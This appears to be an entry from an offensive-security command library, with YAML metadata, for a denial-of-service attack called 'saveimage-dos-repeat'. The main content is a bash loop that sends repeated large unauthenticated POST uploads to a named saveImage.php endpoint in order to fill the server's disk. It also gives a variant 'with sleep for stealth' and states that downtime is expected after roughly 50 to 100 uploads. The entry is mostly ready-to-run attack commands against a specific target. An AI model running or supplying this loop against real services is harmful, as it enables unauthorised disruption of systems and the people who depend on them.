---
data: >-
  for i in {1..100}; do curl -X POST
  https://reverb.twitter.com/api/actions/saveImage.php -d
  "image=<large_data>&filename=doS$i&extension=png"; done
tags:
  - dos
  - loop
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.029Z'
id: c7352648-ebfe-420a-a061-2e1e2c645f3a
verified: false
validated: true
submitted: true
---
# saveimage-dos-repeat

## Command

```bash
for i in {1..100}; do curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=<large_data>&filename=doS$i&extension=png"; done
```

## Description

Loops repeated POST requests with large image data to exhaust disk space via the unauthenticated endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| image | Large data (e.g., 1MB+ placeholder) | Yes |
| filename | Unique name per iteration (e.g., doS$i) | Yes |
| extension | png | Yes |
| loop count | Number of iterations (e.g., 100) | Yes |

## Examples

### Basic Usage

```bash
for i in {1..100}; do curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=<large_data>&filename=doS$i&extension=png"; done
```

### Advanced Usage

With sleep for stealth:

```bash
for i in {1..100}; do curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=<large_data>&filename=doS$i&extension=png"; sleep 1; done
```

## Expected Output

Multiple files created; server disk fills, leading to errors or downtime after ~50-100 uploads depending on space.

## Related

- [[commands/saveimage-normal-post]]
- [[procedures/Perform-DoS-via-Repeated-Large-File-Uploads]]
